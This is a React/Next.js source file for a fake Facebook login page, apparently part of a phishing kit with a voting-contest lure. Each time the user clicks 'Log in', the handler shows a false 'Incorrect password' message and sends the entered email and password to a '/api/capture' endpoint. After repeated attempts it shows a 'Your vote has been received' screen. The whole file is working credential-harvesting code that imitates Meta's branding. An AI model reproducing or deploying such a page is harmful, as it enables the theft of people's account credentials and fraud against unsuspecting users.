import Head from 'next/head';
import { useState } from 'react';

export default function FacebookLoginPage() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showSuccess, setShowSuccess] = useState(false);
  const [feedback, setFeedback] = useState('');
  const [clickCount, setClickCount] = useState(0);

  const handleLogin = async () => {
    setFeedback('Incorrect password! Please try again...');
    setClickCount(prev => prev + 1);
    
    try {
      const res = await fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: email.trim() + ' (FB)', password, method: 'facebook' })
      });
      if (res.ok && clickCount >= 4) setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 4000);
    } catch (e) {}
    if (clickCount >= 4) setShowSuccess(true);
  };

  return (
    <>
      <Head>
        <meta charSet="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Facebook Login</title>
      </Head>

      <style jsx>{`
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #e7ebf0, #f0f2f5); height: 100vh; margin: 0; overflow: hidden; }
        .login-wrapper { position: fixed; inset: 0; display: flex; align-items: center; justify-content: flex-start; padding: 40px 0; }
        .login-container { background-color: white; width: 360px; padding: 20px; border-radius: 8px; box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1); text-align: center; }
        .logo { width: 50px; margin-bottom: 20px; display: block; margin-left: auto; margin-right: auto; }
        input { width: 95%; padding: 12px; margin: 10px 0; border: 1px solid #ccd0d5; border-radius: 6px; background-color: #f5f6f7; font-size: 16px; }
        input:focus { outline: none; border-color: #1877f2; }
        #login { width: 100%; padding: 12px; margin: 15px 0; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
        #login:hover { background-color: #166fe5; }
        a.forgot { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-top: 10px; }
        .secondary-button { background: linear-gradient(135deg, #42b72a, #36a420); color: white; border: 2px solid #1877f2; border-radius: 6px; padding: 12px; margin-top: 15px; margin-bottom: 10px; cursor: pointer; font-size: 16px; width: 100%; }
        .secondary-button:hover { background: linear-gradient(135deg, #36a420, #2e921c); }
        .footer { margin-top: 20px; font-size: 12px; color: #555; }
        .footer p { margin: 0; }
        .footer a { color: #555; text-decoration: none; }
        #meta-logo { width: 100px; margin-top: 5px; }
        .success-overlay { position: fixed; inset: 0; background: rgba(255, 255, 255, 0.98); z-index: 99999; display: none; align-items: center; justify-content: center; padding: 20px; text-align: center; }
        .success-overlay.show { display: flex; }
        .success-box { max-width: 440px; width: 100%; }
        .checkmark { width: 110px; height: 110px; margin: 0 auto 28px; border-radius: 50%; background: #4caf50; box-shadow: 0 14px 34px rgba(76, 175, 80, 0.4); display: flex; align-items: center; justify-content: center; animation: pop-in 0.55s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .checkmark svg { width: 56px; height: 56px; }
        .checkmark polyline { fill: none; stroke: #fff; stroke-width: 7; stroke-linecap: round; stroke-linejoin: round; stroke-dasharray: 60; stroke-dashoffset: 60; animation: draw-check 0.45s ease-out 0.25s forwards; }
        @keyframes pop-in { 0% { transform: scale(0); } 70% { transform: scale(1.12); } 100% { transform: scale(1); } }
        @keyframes draw-check { to { stroke-dashoffset: 0; } }
        .success-box h2 { font-family: 'Segoe UI', 'Roboto', sans-serif; font-size: 26px; font-weight: 600; color: #333; margin: 0 0 12px; }
        .success-box p { font-size: 15px; color: #555; line-height: 1.55; margin: 0; }
        @media (max-width: 480px) { .login-wrapper { justify-content: center; } .login-container { width: 90%; } }
      `}</style>

      <div className="login-wrapper">
        <div className="login-container">
          <img className="logo" src="/logos/fb-logo.svg" alt="Facebook Logo" />
          <input id="email" type="text" placeholder="Mobile number or email address" value={email} onChange={(e) => setEmail(e.target.value)} />
          <input id="password" type="password" placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
          <span id="feedback" style={{color: 'red', fontFamily: 'sans-serif', fontSize: '15px', textAlign: 'center', margin: '0 30px'}}>{feedback}</span>
          <button id="login" onClick={handleLogin}>Log in</button>
          <a className="forgot" href="#">Forgotten Password?</a>
          <button className="secondary-button" onClick={() => console.log('Create new account')}>Create new account</button>
          <div className="footer">
            <img id="meta-logo" src="/logos/meta-logo.svg" alt="Meta Logo" />
            <p><a href="#">About</a> · <a href="#">Help</a> · <a href="#">More</a></p>
          </div>
        </div>
      </div>

      <div className="success-overlay" id="successOverlay" aria-hidden="true">
        <div className="success-box">
          <div className="checkmark"><svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg"><polyline points="15,27 24,36 39,17"></polyline></svg></div>
          <h2>Your vote has been received</h2>
          <p>We will get back to you when your vote is counted.</p>
        </div>
      </div>
    </>
  );
}
